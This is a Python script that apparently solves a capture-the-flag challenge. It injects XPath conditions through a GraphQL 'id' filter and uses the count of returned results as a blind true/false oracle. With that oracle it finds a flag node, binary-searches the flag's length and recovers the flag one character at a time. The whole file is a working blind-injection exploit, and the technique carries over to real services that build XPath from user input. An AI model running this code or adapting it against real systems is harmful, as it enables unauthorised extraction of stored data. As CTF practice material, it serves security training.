import json
import urllib.request
from typing import Optional, Tuple


GRAPHQL_URL = "https://festivals.ctf.zone/graphql"


def post_graphql(payload: dict) -> dict:
    data = json.dumps(payload).encode("utf-8")
    req = urllib.request.Request(
        GRAPHQL_URL,
        data=data,
        headers={
            "Content-Type": "application/json",
            "Accept": "application/json",
        },
        method="POST",
    )
    with urllib.request.urlopen(req, timeout=20) as resp:
        body = resp.read().decode("utf-8", errors="replace")
        return json.loads(body)


def query_with_id(injected_id: str) -> Tuple[Optional[int], dict]:
    query_str = (
        "{ festival(filter:{id: \"" + injected_id + "\"}) { abbreviation name year image imagealt description } }"
    )
    res = post_graphql({"query": query_str})
    count = None
    if isinstance(res, dict) and res.get("data") and isinstance(res["data"].get("festival"), list):
        count = len(res["data"]["festival"])
    return count, res


def condition_true(xpath_condition: str) -> bool:
    injected = f"1' or ({xpath_condition}) or '1'='2"
    count, _ = query_with_id(injected)
    # When true, backend returns many (9); when false, it returns exactly the specific id (1)
    return (count or 0) > 1


def detect_flag_xpath() -> Optional[str]:
    # Try specific nodes likely to hold a flag
    candidates = [
        "(//flag)[1]",
        "(//FLAG)[1]",
        # Case-insensitive element named *flag*
        "(//*[contains(translate(name(), 'abcdefghijklmnopqrstuvwxyz', 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'), 'FLAG')])[1]",
        # Attribute named flag anywhere
        "(//@flag)[1]",
        "(//@FLAG)[1]",
        # Any text/comment containing typical flag prefix
        "(//text()[contains(., 'FLAG{')])[1]",
        "(//text()[contains(., 'flag{')])[1]",
        "(//text()[contains(., 'CTF{')])[1]",
        "(//text()[contains(., 'ctf{')])[1]",
        "(//comment()[contains(., 'FLAG{')])[1]",
        "(//comment()[contains(., 'flag{')])[1]",
        "(//comment()[contains(., 'CTF{')])[1]",
        "(//comment()[contains(., 'ctf{')])[1]",
    ]
    for xp in candidates:
        if condition_true(f"string-length(string({xp})) > 0"):
            return xp
    # Fallback to the document root, we can search within its string value
    if condition_true("string-length(string(/*)) > 0"):
        return "/*"
    return None


def get_flag_length(xp: str, max_len: int = 200) -> int:
    # Incremental search for length
    lo = 0
    hi = max_len
    # Narrow down by binary search for performance
    while lo < hi:
        mid = (lo + hi) // 2
        if condition_true(f"string-length(string({xp})) > {mid}"):
            lo = mid + 1
        else:
            hi = mid
    return lo


def char_is(xp: str, pos: int, ch: str) -> bool:
    # Equality test for single character
    ch_esc = ch.replace("'", "''")
    cond = f"substring(string({xp}), {pos}, 1) = '{ch_esc}'"
    return condition_true(cond)


def recover_flag(xp: str, length: int) -> str:
    result_chars = []
    # Prioritized charset for typical CTF flags
    charset = list("{}_-@#:$%^&*()+/=.,:;!?[]<>|~")
    charset += [chr(c) for c in range(ord('0'), ord('9') + 1)]
    charset += [chr(c) for c in range(ord('A'), ord('Z') + 1)]
    charset += [chr(c) for c in range(ord('a'), ord('z') + 1)]
    # Ensure space is included
    if ' ' not in charset:
        charset.insert(0, ' ')
    for i in range(1, length + 1):
        found = None
        for ch in charset:
            if char_is(xp, i, ch):
                found = ch
                break
        if found is None:
            # Fallback: try full printable ASCII
            for ch in (chr(c) for c in range(32, 127)):
                if char_is(xp, i, ch):
                    found = ch
                    break
        if found is None:
            # Unknown char; mark and continue
            found = '?'
        result_chars.append(found)
        print(f"[pos {i}] => {found}")
    return "".join(result_chars)


def find_prefix_position_in_root(prefixes: list[str], max_len: int = 100000) -> Optional[Tuple[int, str]]:
    # Ensure root has content
    if not condition_true("string-length(string(/*)) > 0"):
        return None
    # Rough upper bound on length
    lo = 0
    hi = max_len
    while lo < hi:
        mid = (lo + hi) // 2
        if condition_true(f"string-length(string(/*)) > {mid}"):
            lo = mid + 1
        else:
            hi = mid
    doc_len = lo
    if doc_len == 0:
        return None
    # Linear scan for reasonable performance, stop on first match
    for prefix in prefixes:
        plen = len(prefix)
        for pos in range(1, doc_len - plen + 2):
            cond = f"substring(string(/*), {pos}, {plen}) = '{prefix}'"
            if condition_true(cond):
                return pos, prefix
    return None


def main() -> None:
    print("[#] Detecting flag XPath...")
    xp = detect_flag_xpath()
    if not xp:
        print("[!] Could not find flag node via common XPaths.")
        return
    print(f"[+] Using node: {xp}")
    if xp == "/*":
        # Search the whole document's string for common flag prefixes
        prefixes = [
            "FLAG{",
            "flag{",
        ]
        found = find_prefix_position_in_root(prefixes)
        if not found:
            print("[!] No common flag prefix found in document string value.")
            return
        start_pos, prefix = found
        print(f"[+] Found prefix '{prefix}' at position {start_pos}")
        # Recover until closing '}'
        collected = prefix
        pos = start_pos + len(prefix)
        while True:
            # Get next character via equality testing
            ch = None
            # Prioritized charset
            charset = list("{}_-@#:$%^&*()+/=.,:;!?[]<>|~")
            charset += [chr(c) for c in range(ord('0'), ord('9') + 1)]
            charset += [chr(c) for c in range(ord('A'), ord('Z') + 1)]
            charset += [chr(c) for c in range(ord('a'), ord('z') + 1)]
            if ' ' not in charset:
                charset.insert(0, ' ')
            for c in charset:
                if condition_true(f"substring(string(/*), {pos}, 1) = '{c.replace("'", "''")}'"):
                    ch = c
                    break
            if ch is None:
                for c in (chr(cc) for cc in range(32, 127)):
                    if condition_true(f"substring(string(/*), {pos}, 1) = '{c.replace("'", "''")}'"):
                        ch = c
                        break
            if ch is None:
                ch = '?'
            collected += ch
            print(f"[pos {pos}] => {ch}")
            if ch == '}':
                print(f"[+] Flag: {collected}")
                return
            pos += 1
    else:
        length = get_flag_length(xp)
        print(f"[+] Flag length: {length}")
        if length == 0:
            print("[!] Empty flag?")
            return
        flag = recover_flag(xp, length)
        print(f"[+] Flag: {flag}")


if __name__ == "__main__":
    main()


